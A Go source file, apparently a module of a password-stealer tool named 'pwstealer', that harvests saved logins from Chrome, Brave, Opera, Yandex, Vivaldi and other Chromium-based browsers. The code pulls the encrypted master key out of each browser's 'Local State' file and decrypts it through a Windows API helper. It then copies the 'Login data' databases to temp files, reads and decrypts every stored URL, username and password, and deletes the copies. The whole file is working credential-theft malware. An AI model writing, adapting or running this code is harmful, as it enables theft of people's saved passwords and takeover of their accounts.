package chrome

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"marengo/modules/pwstealer/common"
	"marengo/modules/pwstealer/utils"
	"os"

	"github.com/buger/jsonparser"
	"github.com/go-sqlite/sqlite3"
)

var (
	/*
		Paths for more interesting and popular browsers for us
	*/
	chromePathsUserData = []string{
		common.LocalAppData + "\\Google\\Chrome\\User Data",               // Google chrome
		common.LocalAppData + "\\BraveSoftware\\Brave-Browser\\User Data", // Brave-Browser
		common.AppData + "\\Opera Software\\Opera Stable",                 // Opera
		common.LocalAppData + "\\Yandex\\YandexBrowser\\User Data",        // Yandex browser
		common.LocalAppData + "\\Vivaldi\\User Data",                      // Vivaldi
		common.LocalAppData + "\\CentBrowser\\User Data",                  // CentBrowser
		common.LocalAppData + "\\Amigo\\User Data",                        // Amigo (RIP)
		common.LocalAppData + "\\Chromium\\User Data",                     // Chromium
		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data",             // Sputnik
	}
)

func ChromeExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}

	var allCreds []common.UrlNamePass

	for _, ChromePath := range chromePathsUserData {
		if _, err := os.Stat(ChromePath); err == nil {

			var data, success = chromeModuleStart(ChromePath)
			if success && data != nil {
				allCreds = append(allCreds, data...)
			}
		}
	}

	if len(allCreds) == 0 {
		return EmptyResult
	} else {
		Result.Success = true
		return common.ExtractCredentialsResult{
			Success: true,
			Data:    allCreds,
		}
	}
}
func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
	if _, err := os.Stat(path + "\\Local State"); err == nil {
		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
		if err != nil {
			return nil, false
		}
		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")

		var profileNames []string

		//todo delete this piece of... is there a more smartly way?
		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
			profileNames = append(profileNames, string(key))
			return nil
		}, "info_cache")
		os_crypt, _, _, _ := jsonparser.Get(fileWithUserData, "os_crypt")

		base64key, _, _, _ := jsonparser.Get(os_crypt, "encrypted_key")
		secretKey, err := base64.StdEncoding.DecodeString(string(base64key))
		decrypted_secretKey, err := utils.DecryptWinApi(secretKey[5:])
		var temporaryDbNames []string
		for _, profileName := range profileNames {
			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileName)
			if _, err := os.Stat(dbPath); err == nil {
				//randomDbName := common.RandStringRunes(10)

				file, _ := ioutil.TempFile(os.TempDir(), "prefix")
				err := common.CopyFile(dbPath, file.Name())
				if err != nil {
					return nil, false
				}
				temporaryDbNames = append(temporaryDbNames, file.Name())
			}
		}

		for _, tmpDB := range temporaryDbNames {
			db, err := sqlite3.Open(tmpDB)
			// db, err := sql.Open("sqlite3", tmpDB)
			if err != nil {
				fmt.Println(err.Error())
				return nil, false
			}
			var data []common.UrlNamePass
			err = utils.VisitTableRows(db, `logins`, map[string]string{}, func(rowId *int64, row utils.TableRow) error {
				var err error

				actionUrl, err := row.String(`origin_url`)
				if err != nil {
					fmt.Println(err)
					return err
				}

				username, err := row.String(`username_value`)
				if err != nil {
					fmt.Println(err)
					return err
				}

				password, err := row.Value(`password_value`)
				if err != nil {
					fmt.Println(err)

					return err
				}
				realpassword, err := utils.DecryptCipherText(password.([]byte), decrypted_secretKey)
				if err != nil {
					fmt.Println(err)

					return err
				}

				data = append(data, common.UrlNamePass{actionUrl, username, string(realpassword)})
				return nil
			})
			// remove already used database
			os.Remove(tmpDB)
			if err != nil {
				return nil, false
			}
			return data, true
		}
	}
	return nil, false
}
